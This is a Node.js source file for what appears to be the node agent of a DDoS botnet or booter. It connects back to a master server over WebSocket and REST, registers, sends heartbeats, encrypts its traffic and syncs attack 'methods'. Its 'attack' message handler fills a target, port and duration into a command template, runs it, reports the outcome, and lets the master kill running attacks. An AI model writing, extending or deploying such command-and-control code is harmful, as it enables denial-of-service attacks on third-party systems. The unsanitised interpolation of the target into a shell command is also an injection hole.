import os from 'os';
import WebSocket from 'ws';
import fs from 'fs';
import { calculateMethodsVersionHash, syncMethodsWithMaster } from './methodSync.js';

// Helper function untuk fetch dengan timeout menggunakan AbortController
async function fetchWithTimeout(url, options = {}, timeout = 10000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await globalThis.fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}

function createReverseClient(config, executor, methodsConfig) {
  if (!config || !config.NODE || !config.NODE.ID) {
    console.error('[REVERSE] ERROR: config.NODE.ID is not defined!');
    throw new Error('config.NODE.ID is required for reverse client');
  }
  
  let ws = null;
  let reconnectTimeout = null;
  let currentMethodsConfig = methodsConfig || {};
  let isShuttingDown = false;
  let pingInterval = null;
  let reconnectAttempts = 0;
  const maxReconnectAttempts = config.REVERSE?.MAX_RECONNECT_ATTEMPTS || 10;
  
  let masterDownDetection = {
    lastHeartbeatSuccess: Date.now(),
    consecutiveFailures: 0,
    maxConsecutiveFailures: 5,
    isMasterDown: false
  };
 
  let masterCameBack = false;
  
  console.log(`[REVERSE] Initializing with node_id: ${config.NODE.ID}`);
  
  let encryptionManager = null;
  if (config.ENCRYPTION && config.ENCRYPTION.ENABLED) {
    (async () => {
      try {
        const { default: EncryptionManager } = await import('./encryption.js');
        encryptionManager = new EncryptionManager({
          ...config,
          ENCRYPTION: {
            ...config.ENCRYPTION,
            NODE_ID: config.NODE.ID
          }
        });
        console.log('[REVERSE] Encryption loaded for WebSocket');
      } catch (error) {
        console.error('[REVERSE] Failed to load encryption:', error.message);
        // Non-fatal error, continue without encryption
      }
    })();
  }

  function isEncryptionEnabled() {
    return !!(encryptionManager && config.ENCRYPTION && config.ENCRYPTION.ENABLED);
  }

  function updateMasterDownStatus(success) {
    const now = Date.now();
    
    if (success) {
      masterDownDetection.lastHeartbeatSuccess = now;
      masterDownDetection.consecutiveFailures = 0;
      
      if (masterDownDetection.isMasterDown) {
        masterDownDetection.isMasterDown = false;
        masterCameBack = true;
        console.log('[REVERSE] ✓ Master is back online!');
        
        if (!ws || ws.readyState !== WebSocket.OPEN) {
          console.log('[REVERSE] Attempting WebSocket reconnect after master recovery...');
          scheduleImmediateReconnect();
        }
      }
    } else {
      masterDownDetection.consecutiveFailures++;
      
      if (masterDownDetection.consecutiveFailures >= masterDownDetection.maxConsecutiveFailures) {
        if (!masterDownDetection.isMasterDown) {
          masterDownDetection.isMasterDown = true;
          console.log('[REVERSE] ⚠ Master appears to be down (multiple heartbeat failures)');
          
          if (ws) {
            console.log(`[REVERSE] WebSocket state: ${['CONNECTING', 'OPEN', 'CLOSING', 'CLOSED'][ws.readyState]}`);
          }
        }
      }
      
      if (now - masterDownDetection.lastHeartbeatSuccess > 300000) { // 5 menit
        console.log('[REVERSE] No successful heartbeat for 5 minutes, forcing reconnection...');
        forceReconnect();
      }
    }
  }

  function forceReconnect() {
    console.log('[REVERSE] Forcing WebSocket reconnection...');
    
    if (ws) {
      try {
        ws.close();
      } catch (error) {
        // Ignore error
      }
      ws = null;
    }
    
    reconnectAttempts = 0;
    
    scheduleImmediateReconnect();
  }

  function scheduleImmediateReconnect() {
    if (isShuttingDown) {
      return;
    }

    if (reconnectTimeout) {
      clearTimeout(reconnectTimeout);
    }

    console.log('[REVERSE] Scheduling immediate WebSocket reconnect...');
    
    reconnectTimeout = setTimeout(() => {
      reconnectTimeout = null;
      connect();
    }, 1000);
  }

  function updateMethodsConfig(newConfig) {
    if (newConfig && typeof newConfig === 'object') {
      currentMethodsConfig = newConfig;
      console.log(
        `[REVERSE] Methods config updated: ${Object.keys(
          currentMethodsConfig
        ).length} methods`
      );
      return true;
    }
    return false;
  }

  function refreshMethodsConfig() {
    try {
      const methodsPath = config.SERVER.METHODS_PATH;
      const raw = fs.readFileSync(methodsPath, 'utf8');
      const parsed = JSON.parse(raw);
      currentMethodsConfig = parsed;
      console.log(
        `[REVERSE] Local methodsConfig refreshed: ${Object.keys(
          currentMethodsConfig
        ).length} methods`
      );
      return true;
    } catch (e) {
      console.error(
        '[REVERSE] Failed to refresh methods config lokal:',
        e.message
      );
      return false;
    }
  }

  function getMethodsVersionHash() {
    try {
      return calculateMethodsVersionHash(currentMethodsConfig);
    } catch {
      return 'unknown';
    }
  }

  async function getFullStatusForHeartbeat() {
    try {
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      const usedMem = totalMem - freeMem;
      const memUsagePercent = ((usedMem / totalMem) * 100).toFixed(2);

      const loadAvg = os.loadavg();
      const uptime = os.uptime();
      const activeProcesses = executor.getActiveProcesses();

      const methodsVersion = getMethodsVersionHash();
      const methodsCount = Object.keys(currentMethodsConfig).length;

      return {
        timestamp: new Date().toISOString(),
        mode: 'REVERSE',
        system: {
          platform: os.platform(),
          arch: os.arch(),
          hostname: os.hostname()
        },
        cpu: {
          load_average: {
            '1': loadAvg[0],
            '5': loadAvg[1],
            '15': loadAvg[2]
          }
        },
        memory: {
          total: totalMem,
          used: usedMem,
          free: freeMem,
          usage_percent: parseFloat(memUsagePercent)
        },
        uptime_seconds: uptime,
        active_processes: activeProcesses.length,
        methods: {
          version_hash: methodsVersion,
          count: methodsCount,
          supported: Object.keys(currentMethodsConfig)
        },
        connection: {
          type: 'reverse',
          ws_connected: ws && ws.readyState === WebSocket.OPEN,
          ws_state: ws ? ws.readyState : 'NO_CONNECTION',
          encryption: !!(config.ENCRYPTION && config.ENCRYPTION.ENABLED),
          master_status: masterDownDetection.isMasterDown ? 'down' : 'up',
          consecutive_failures: masterDownDetection.consecutiveFailures
        },
        node_config: {
          ip: config.NODE.IP || null,
          port: config.SERVER.PORT,
          env: config.NODE.ENV || 'production'
        }
      };
    } catch (error) {
      console.error(
        '[REVERSE-HEARTBEAT] Error getting full status:',
        error
      );
      
      return {
        timestamp: new Date().toISOString(),
        mode: 'REVERSE',
        error: error.message
      };
    }
  }

  async function sendRestHeartbeat() {
    if (!config.MASTER?.URL) {
      console.log(
        '[REVERSE-HEARTBEAT] MASTER_URL not configured, skip REST heartbeat'
      );
      updateMasterDownStatus(false);
      return { success: false, error: 'NO_MASTER_URL_OR_FETCH' };
    }

    try {
      const status = await getFullStatusForHeartbeat();

      const nodeId = config.NODE.ID;
      if (!nodeId) {
        throw new Error('NODE.ID is not configured');
      }
      
      const requestBody = {
        node_id: nodeId,
        mode: 'REVERSE',
        ...status
      };

      console.log(
        `[REVERSE-HEARTBEAT] Sending heartbeat to ${config.MASTER.URL}/heartbeat...`
      );

      const start = Date.now();
      
      let body;
      const headers = {
        'Content-Type': 'application/json',
        'User-Agent': `Node/${nodeId}`,
        'X-Node-Mode': 'REVERSE',
        'X-Node-ID': nodeId
      };
      
      if (isEncryptionEnabled()) {
        console.log('[REVERSE-HEARTBEAT] Encrypting heartbeat data...');
        const encrypted = encryptionManager.createSecureMessage(requestBody, 'heartbeat');
        body = JSON.stringify(encrypted);
        headers['X-Encryption'] = 'enabled';
        headers['X-Encryption-Version'] = config.ENCRYPTION?.VERSION || 'none';
      } else {
        body = JSON.stringify(requestBody);
      }
      
      const res = await fetchWithTimeout(
        `${config.MASTER.URL}/heartbeat`,
        {
          method: 'POST',
          headers,
          body
        },
        10000
      );
      const responseTime = Date.now() - start;

      if (res.ok) {
        const responseText = await res.text();
        let responseData = {};
        
        try {
          const parsed = JSON.parse(responseText);
          if (parsed.envelope === 'secure' && isEncryptionEnabled()) {
            const decrypted = encryptionManager.processSecureMessage(parsed);
            if (decrypted.success) {
              responseData = decrypted.data;
            } else {
              responseData = parsed;
            }
          } else {
            responseData = parsed;
          }
        } catch {
          responseData = {};
        }
        
        console.log(
          `[REVERSE-HEARTBEAT] ✓ Heartbeat sent successfully (${responseTime}ms)`
        );
        
        updateMasterDownStatus(true);
        
        return {
          success: true,
          response: responseData,
          responseTime,
          encrypted: isEncryptionEnabled()
        };
      } else {
        const errorText = await res.text().catch(
          () => 'No error message'
        );
        console.log(
          `[REVERSE-HEARTBEAT] ✗ Heartbeat failed: HTTP ${res.status}`
        );
        
        updateMasterDownStatus(false);
        
        return {
          success: false,
          error: `HTTP ${res.status}`,
          status: res.status,
          details: errorText
        };
      }
    } catch (err) {
      console.error('[REVERSE-HEARTBEAT] Heartbeat error:', err.message);
      
      updateMasterDownStatus(false);
      
      return {
        success: false,
        error: err.message
      };
    }
  }

  async function registerWithMaster() {
    if (!config.MASTER?.URL) {
      console.log(
        '[REVERSE-REGISTER] MASTER_URL not configured, skip registration'
      );
      return { success: false, error: 'NO_MASTER_URL_OR_FETCH' };
    }

    try {
      const methodsVersion = getMethodsVersionHash();

      const bodyData = {
        node_id: config.NODE.ID,
        hostname: os.hostname(),
        ip: config.NODE.IP || null,
        port: config.SERVER.PORT,
        methods_supported: Object.keys(currentMethodsConfig),
        env: config.NODE.ENV || 'production',
        timestamp: new Date().toISOString(),
        methods_version: methodsVersion,
        methods_count: Object.keys(currentMethodsConfig).length,
        mode: 'REVERSE',
        connection_type: 'websocket',
        capabilities: {
          encryption: !!(config.ENCRYPTION && config.ENCRYPTION.ENABLED),
          version: config.ENCRYPTION?.VERSION || 'none',
          direct_access: false,
          reverse_only: true 
        }
      };

      console.log(
        `[REVERSE-REGISTER] Registering to ${config.MASTER.URL}/register...`
      );

      let body;
      const headers = {
        'Content-Type': 'application/json',
        'User-Agent': `Node/${config.NODE.ID}`
      };
      
      if (isEncryptionEnabled()) {
        const encrypted = encryptionManager.createSecureMessage(bodyData, 'register');
        body = JSON.stringify(encrypted);
        headers['X-Encryption'] = 'enabled';
        headers['X-Encryption-Version'] = config.ENCRYPTION?.VERSION || 'none';
      } else {
        body = JSON.stringify(bodyData);
      }

      const res = await fetchWithTimeout(
        `${config.MASTER.URL}/register`,
        {
          method: 'POST',
          headers,
          body
        },
        15000
      );

      if (res.ok) {
        const responseText = await res.text();
        let data = {};
        
        try {
          const parsed = JSON.parse(responseText);
          if (parsed.envelope === 'secure' && isEncryptionEnabled()) {
            const decrypted = encryptionManager.processSecureMessage(parsed);
            if (decrypted.success) {
              data = decrypted.data;
            } else {
              data = parsed;
            }
          } else {
            data = parsed;
          }
        } catch {
          data = {};
        }
        
        console.log(
          `[REVERSE-REGISTER] ✓ Registered successfully to master`
        );
        console.log(
          `[REVERSE-REGISTER] Methods: ${
            Object.keys(currentMethodsConfig).length
          }, Version: ${methodsVersion.substring(0, 8)}`
        );

        return {
          success: true,
          data,
          methodsVersion,
          encrypted: isEncryptionEnabled()
        };
      } else {
        const errorText = await res.text().catch(() => '');
        console.log(
          `[REVERSE-REGISTER] ✗ Register failed: HTTP ${res.status} - ${errorText}`
        );
        return {
          success: false,
          error: `HTTP ${res.status}`,
          status: res.status
        };
      }
    } catch (err) {
      console.error('[REVERSE-REGISTER] Register error:', err.message);
      return {
        success: false,
        error: err.message
      };
    }
  }

  async function getSimpleStatus() {
    try {
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      const usedMem = totalMem - freeMem;
      const memUsagePercent = ((usedMem / totalMem) * 100).toFixed(2);
      const loadAvg = os.loadavg();
      const uptime = os.uptime();
      const activeProcesses = executor.getActiveProcesses();

      return {
        node_id: config.NODE.ID,
        system: {
          hostname: os.hostname(),
          platform: os.platform()
        },
        memory: {
          usage_percent: parseFloat(memUsagePercent)
        },
        cpu: {
          load_average: loadAvg[0]
        },
        uptime_seconds: uptime,
        active_processes: activeProcesses.length,
        methods_count: Object.keys(currentMethodsConfig).length,
        ws_connected: ws && ws.readyState === WebSocket.OPEN,
        encryption: !!(config.ENCRYPTION && config.ENCRYPTION.ENABLED),
        master_status: masterDownDetection.isMasterDown ? 'down' : 'up'
      };
    } catch (error) {
      console.error('[REVERSE] Error getting simple status:', error);
      return {
        node_id: config.NODE.ID,
        error: error.message,
        ws_connected: false,
        master_status: 'unknown'
      };
    }
  }

  async function processWebSocketMessage(raw) {
    try {
      const parsed = JSON.parse(raw.toString());
      
      if (parsed.envelope === 'secure' && isEncryptionEnabled()) {
        const result = encryptionManager.processSecureMessage(parsed);
        if (result.success) {
          return {
            success: true,
            data: result.data,
            type: result.type,
            encrypted: true,
            metadata: result.metadata
          };
        } else {
          console.log('[REVERSE] Failed to decrypt message:', result.error);
          return {
            success: false,
            error: result.error,
            raw: parsed
          };
        }
      } else if (parsed.envelope === 'plain') {
        return {
          success: true,
          data: parsed.payload,
          type: parsed.metadata?.messageType || 'unknown',
          encrypted: false,
          metadata: parsed.metadata
        };
      } else {
        return {
          success: true,
          data: parsed,
          type: parsed.type || 'unknown',
          encrypted: false
        };
      }
    } catch (error) {
      console.log('[REVERSE] Invalid WebSocket message:', error.message);
      return {
        success: false,
        error: error.message
      };
    }
  }

  function connect() {
    if (isShuttingDown) {
      console.log('[REVERSE] Shutting down, skipping connection');
      return;
    }

    if (!config.MASTER?.WS_URL) {
      console.log('[REVERSE] WS: Master WS URL not configured');
      return;
    }

    if (
      ws &&
      (ws.readyState === WebSocket.OPEN ||
        ws.readyState === WebSocket.CONNECTING)
    ) {
      console.log('[REVERSE] WS: Already connected or connecting');
      return;
    }

    console.log(
      `[REVERSE] WS: Connecting to ${config.MASTER.WS_URL} (attempt ${reconnectAttempts + 1})`
    );

    try {
      const headers = {
        'User-Agent': `Node/${config.NODE.ID}`,
        'X-Node-ID': config.NODE.ID,
        'X-Node-Mode': 'REVERSE'
      };
      
      if (config.ENCRYPTION && config.ENCRYPTION.ENABLED) {
        headers['X-Encryption'] = 'enabled';
        headers['X-Encryption-Version'] = config.ENCRYPTION.VERSION || '1.0';
      }

      ws = new WebSocket(config.MASTER.WS_URL, {
        headers,
        handshakeTimeout: 10000
      });

      ws.on('open', async () => {
        console.log('[REVERSE] WS: ✓ Connected to master');
        reconnectAttempts = 0;
        masterDownDetection.isMasterDown = false;
        masterCameBack = false;

        const msg = {
          type: 'register',
          node_id: config.NODE.ID,
          hostname: os.hostname(),
          ip: config.NODE.IP || null,
          port: config.SERVER.PORT,
          methods_supported: Object.keys(currentMethodsConfig),
          env: config.NODE.ENV || 'production',
          mode: 'REVERSE',
          methods_version: getMethodsVersionHash(),
          methods_count: Object.keys(currentMethodsConfig).length,
          timestamp: new Date().toISOString(),
          capabilities: {
            encryption: !!(config.ENCRYPTION && config.ENCRYPTION.ENABLED),
            version: config.ENCRYPTION?.VERSION || 'none'
          }
        };

        if (isEncryptionEnabled()) {
          const encryptedMsg = encryptionManager.createSecureMessage(msg, 'register');
          send(encryptedMsg);
        } else {
          send(msg);
        }

        if (pingInterval) {
          clearInterval(pingInterval);
          pingInterval = null;
        }
        pingInterval = setInterval(() => {
          if (ws && ws.readyState === WebSocket.OPEN) {
            try {
              ws.ping();
            } catch (error) {
              console.log(
                '[REVERSE] WS: Ping error:',
                error.message
              );
            }
          }
        }, 30000);

        setTimeout(async () => {
          try {
            const registerResult = await registerWithMaster();
            if (registerResult.success) {
              console.log(
                '[REVERSE] ✓ Registered with master via REST API'
              );

              setTimeout(async () => {
                try {
                  await sendRestHeartbeat();
                } catch (error) {
                  console.error('[REVERSE] Initial heartbeat failed:', error.message);
                }
              }, 2000);
            } else {
              console.log(
                '[REVERSE] ✗ Failed to register via REST API:',
                registerResult.error
              );
            }
          } catch (error) {
            console.error(
              '[REVERSE] Register via REST error:',
              error
            );
          }
        }, 1000);
      });

      ws.on('message', async (raw) => {
        const processed = await processWebSocketMessage(raw);
        if (processed.success) {
          await handleMessage(processed);
        } else {
          console.log('[REVERSE] WS: Failed to process message');
        }
      });

      ws.on('close', (code, reason) => {
        const reasonStr = reason?.toString?.() || '';
        console.log(
          `[REVERSE] WS: Disconnected (code: ${code}, reason: ${reasonStr})`
        );

        cleanupPingInterval();

        if (!isShuttingDown) {
          reconnectAttempts++;
          if (reconnectAttempts >= maxReconnectAttempts) {
            console.log('[REVERSE] WS: Max reconnect attempts reached, giving up');
            setTimeout(() => {
              reconnectAttempts = 0;
              console.log('[REVERSE] WS: Reset reconnect attempts, will try again');
              scheduleReconnect();
            }, 300000);
            return;
          }
          scheduleReconnect();
        }
      });

      ws.on('error', (error) => {
        console.log(`[REVERSE] WS: Error - ${error.message}`);

        cleanupPingInterval();

        if (!isShuttingDown) {
          reconnectAttempts++;
          if (reconnectAttempts >= maxReconnectAttempts) {
            console.log('[REVERSE] WS: Max reconnect attempts reached, giving up');
            setTimeout(() => {
              reconnectAttempts = 0;
              console.log('[REVERSE] WS: Reset reconnect attempts, will try again');
              scheduleReconnect();
            }, 300000);
            return;
          }
          scheduleReconnect();
        }
      });
    } catch (error) {
      console.error('[REVERSE] WS: Connection error:', error);
      if (!isShuttingDown) {
        reconnectAttempts++;
        scheduleReconnect();
      }
    }
  }

  function scheduleReconnect() {
    if (isShuttingDown) {
      return;
    }

    if (reconnectTimeout) {
      clearTimeout(reconnectTimeout);
    }

    const baseDelay = Math.min(30000 * Math.pow(1.5, reconnectAttempts), 300000);
    const jitter = Math.random() * 5000; // 0-5s jitter
    const delay = baseDelay + jitter;

    console.log(
      `[REVERSE] WS: Reconnecting in ${Math.round(
        delay / 1000
      )} seconds... (attempt ${reconnectAttempts + 1}/${maxReconnectAttempts})`
    );

    reconnectTimeout = setTimeout(() => {
      reconnectTimeout = null;
      connect();
    }, delay);
  }
  
  function cleanupPingInterval() {
    if (pingInterval) {
      clearInterval(pingInterval);
      pingInterval = null;
      console.log('[REVERSE] WS: Ping interval cleaned up');
    }
  }

  function send(obj) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      console.log(
        '[REVERSE] WS: Cannot send - connection not open'
      );
      return false;
    }

    try {
      ws.send(JSON.stringify(obj));
      return true;
    } catch (error) {
      console.log(
        `[REVERSE] WS: Send error - ${error.message}`
      );
      return false;
    }
  }

  async function handleMessage(processed) {
    const { data, type, encrypted } = processed;
    
    console.log(
      `[REVERSE] WS: Received message type: ${type} ${encrypted ? '(encrypted)' : ''}`
    );

    switch (type) {
      case 'ping': {
        const pongMsg = { type: 'pong' };
        if (isEncryptionEnabled() && encrypted) {
          const encryptedPong = encryptionManager.createSecureMessage(pongMsg, 'pong');
          send(encryptedPong);
        } else {
          send(pongMsg);
        }
        break;
      }

      case 'register_ack':
        console.log(
          '[REVERSE] WS: Registration acknowledged by master'
        );
        if (data.master_methods_version) {
          console.log(
            `[REVERSE] WS: Master methods version: ${data.master_methods_version.substring(
              0,
              8
            )}`
          );
        }
        break;

      case 'attack': {
        const { requestId, target, time, port, methods } = data;

        if (!currentMethodsConfig[methods]) {
          const errorResponse = {
            type: 'attack_result',
            requestId,
            success: false,
            error: 'INVALID_METHOD'
          };
          
          if (isEncryptionEnabled() && encrypted) {
            const encryptedError = encryptionManager.createSecureMessage(errorResponse, 'attack_result');
            send(encryptedError);
          } else {
            send(errorResponse);
          }
          return;
        }

        const timeNum = Number(time);
        const portNum = Number(port) || 80;

        const cmdTemplate = currentMethodsConfig[methods].cmd;
        const command = cmdTemplate
          .replaceAll('{target}', String(target))
          .replaceAll('{time}', String(timeNum))
          .replaceAll('{port}', String(portNum));

        try {
          const result = await executor.execute(command, {
            expectedDuration: timeNum
          });
          const successResponse = {
            type: 'attack_result',
            requestId,
            success: true,
            processId: result.processId,
            pid: result.pid,
            target,
            time: timeNum,
            port: portNum,
            methods
          };
          
          if (isEncryptionEnabled() && encrypted) {
            const encryptedSuccess = encryptionManager.createSecureMessage(successResponse, 'attack_result');
            send(encryptedSuccess);
          } else {
            send(successResponse);
          }

          console.log(
            `[REVERSE] Attack executed: ${target}:${portNum} for ${timeNum}s using ${methods}`
          );
        } catch (error) {
          const errorResponse = {
            type: 'attack_result',
            requestId,
            success: false,
            error:
              error.error ||
              error.message ||
              'Execution failed',
            target,
            time: timeNum,
            methods
          };
          
          if (isEncryptionEnabled() && encrypted) {
            const encryptedError = encryptionManager.createSecureMessage(errorResponse, 'attack_result');
            send(encryptedError);
          } else {
            send(errorResponse);
          }

          console.error(
            `[REVERSE] Attack failed: ${error.message}`
          );
        }
        break;
      }

      case 'get_status': {
        const status = await getSimpleStatus();
        const response = {
          type: 'status_result',
          requestId: data.requestId,
          status
        };
        
        if (isEncryptionEnabled() && encrypted) {
          const encryptedResponse = encryptionManager.createSecureMessage(response, 'status_result');
          send(encryptedResponse);
        } else {
          send(response);
        }
        break;
      }

      case 'kill_process': {
        const { processId, requestId } = data;
        const killed = executor.killProcess(Number(processId));
        const response = {
          type: 'kill_result',
          requestId,
          success: killed,
          processId: Number(processId)
        };
        
        if (isEncryptionEnabled() && encrypted) {
          const encryptedResponse = encryptionManager.createSecureMessage(response, 'kill_result');
          send(encryptedResponse);
        } else {
          send(response);
        }

        console.log(
          `[REVERSE] Kill process ${processId}: ${
            killed ? 'success' : 'failed'
          }`
        );
        break;
      }

      case 'kill_all': {
        const { requestId } = data;
        const killed = executor.killAllProcesses();
        const response = {
          type: 'kill_all_result',
          requestId,
          killed
        };
        
        if (isEncryptionEnabled() && encrypted) {
          const encryptedResponse = encryptionManager.createSecureMessage(response, 'kill_all_result');
          send(encryptedResponse);
        } else {
          send(response);
        }

        console.log(
          `[REVERSE] Kill all processes: ${killed} processes killed`
        );
        break;
      }

      case 'sync_methods': {
        const { requestId } = data;

        try {
          const syncResult = await syncMethodsWithMaster(config);
          const response = {
            type: 'sync_result',
            node_id: config.NODE.ID,
            requestId,
            success: syncResult ? syncResult.success : false,
            version_hash: syncResult
              ? syncResult.version_hash
              : null,
            up_to_date: syncResult
              ? syncResult.up_to_date
              : false,
            message: syncResult
              ? syncResult.message
              : 'Sync failed'
          };
          
          if (isEncryptionEnabled() && encrypted) {
            const encryptedResponse = encryptionManager.createSecureMessage(response, 'sync_result');
            send(encryptedResponse);
          } else {
            send(response);
          }

          if (
            syncResult &&
            syncResult.success &&
            !syncResult.up_to_date
          ) {
            console.log(
              '[REVERSE] Methods updated via sync, refreshing config...'
            );
            refreshMethodsConfig();
          }
        } catch (error) {
          const errorResponse = {
            type: 'sync_result',
            node_id: config.NODE.ID,
            requestId,
            success: false,
            error: error.message
          };
          
          if (isEncryptionEnabled() && encrypted) {
            const encryptedError = encryptionManager.createSecureMessage(errorResponse, 'sync_result');
            send(encryptedError);
          } else {
            send(errorResponse);
          }
        }
        break;
      }

      case 'methods_updated': {
        const { master_version, method_count, message } = data;
        console.log(
          `[REVERSE] WS: Methods updated notification from master`
        );
        console.log(
          `[REVERSE] WS: Master version: ${master_version.substring(
            0,
            8
          )}, Methods: ${method_count}`
        );
        console.log(`[REVERSE] WS: ${message}`);

        const ackResponse = {
          type: 'methods_updated_ack',
          node_id: config.NODE.ID,
          version_hash: getMethodsVersionHash(),
          timestamp: new Date().toISOString()
        };
        
        if (isEncryptionEnabled() && encrypted) {
          const encryptedAck = encryptionManager.createSecureMessage(ackResponse, 'methods_updated_ack');
          send(encryptedAck);
        } else {
          send(ackResponse);
        }

        const currentVersion = getMethodsVersionHash();
        if (currentVersion !== master_version) {
          console.log(
            '[REVERSE] WS: Versions differ, triggering sync...'
          );
          setTimeout(async () => {
            try {
              const syncResult = await syncMethodsWithMaster(
                config
              );
              if (syncResult && syncResult.success) {
                console.log(
                  '[REVERSE] WS: Sync completed after notification'
                );
                if (!syncResult.up_to_date) {
                  refreshMethodsConfig();
                }
              }
            } catch (error) {
              console.error(
                '[REVERSE] WS: Sync error after notification:',
                error
              );
            }
          }, 2000);
        }
        break;
      }

      case 'heartbeat_ack':
        break;

      default:
        console.log(
          `[REVERSE] WS: Unknown message type: ${type}`
        );
    }
  }

  function startBackgroundHeartbeat(interval = 30000) {
    let heartbeatInterval = null;

    async function executeHeartbeat() {
      try {
        const result = await sendRestHeartbeat();
        
        if (result.success) {
          console.log(`[REVERSE] ✓ Background heartbeat sent (${new Date().toLocaleTimeString()})`);
          
          if (masterCameBack && (!ws || ws.readyState !== WebSocket.OPEN)) {
            masterCameBack = false;
            console.log('[REVERSE] Master is back, attempting WebSocket reconnection...');
            scheduleImmediateReconnect();
          }
        } else {
          console.error(`[REVERSE] ✗ Background heartbeat failed:`, result.error);
          console.log(`[REVERSE] Will retry in ${interval/1000} seconds...`);
        }
      } catch (error) {
        console.error(`[REVERSE] ✗ Background heartbeat error:`, error.message);
        console.log(`[REVERSE] Will retry in ${interval/1000} seconds...`);
      }
    }

    function start() {
      if (heartbeatInterval) {
        clearInterval(heartbeatInterval);
      }
      
      setTimeout(executeHeartbeat, 2000);
      
      heartbeatInterval = setInterval(executeHeartbeat, interval);
      console.log(`[REVERSE] Started INFINITE RETRY background heartbeat every ${interval}ms`);
    }

    function stop() {
      if (heartbeatInterval) {
        clearInterval(heartbeatInterval);
        heartbeatInterval = null;
        console.log('[REVERSE] Stopped background heartbeat');
      }
    }

    return {
      start,
      stop,
      execute: executeHeartbeat
    };
  }

  function shutdown() {
    console.log('[REVERSE] Shutting down...');
    isShuttingDown = true;

    if (reconnectTimeout) {
      clearTimeout(reconnectTimeout);
      reconnectTimeout = null;
    }

    cleanupPingInterval();

    if (ws) {
      try {
        if (ws.readyState === WebSocket.OPEN) {
          const goodbyeMsg = {
            type: 'goodbye',
            node_id: config.NODE.ID,
            timestamp: new Date().toISOString()
          };
          
          if (isEncryptionEnabled()) {
            const encryptedGoodbye = encryptionManager.createSecureMessage(goodbyeMsg, 'goodbye');
            ws.send(JSON.stringify(encryptedGoodbye));
          } else {
            ws.send(JSON.stringify(goodbyeMsg));
          }
        }
        ws.close();
      } catch {
        // Ignore error
      }
    }
  }

  return {
    connect,
    send,
    getStatus: getSimpleStatus,
    getFullStatus: getFullStatusForHeartbeat,
    sendHeartbeat: sendRestHeartbeat,
    sendRestHeartbeat,
    registerWithMaster,
    startBackgroundHeartbeat,
    updateMethodsConfig,
    shutdown,
    isConnected: () => ws && ws.readyState === WebSocket.OPEN,
    getConnectionState: () =>
      ws
        ? {
            readyState: ws.readyState,
            state: ['CONNECTING', 'OPEN', 'CLOSING', 'CLOSED'][
              ws.readyState
            ],
            bufferedAmount: ws.bufferedAmount
          }
        : { readyState: -1, state: 'NOT_CONNECTED' },
    getMethodsCount: () =>
      Object.keys(currentMethodsConfig).length,
    getMethodsVersion: getMethodsVersionHash,
    isEncryptionEnabled,
    forceReconnect
  };
}

export default createReverseClient;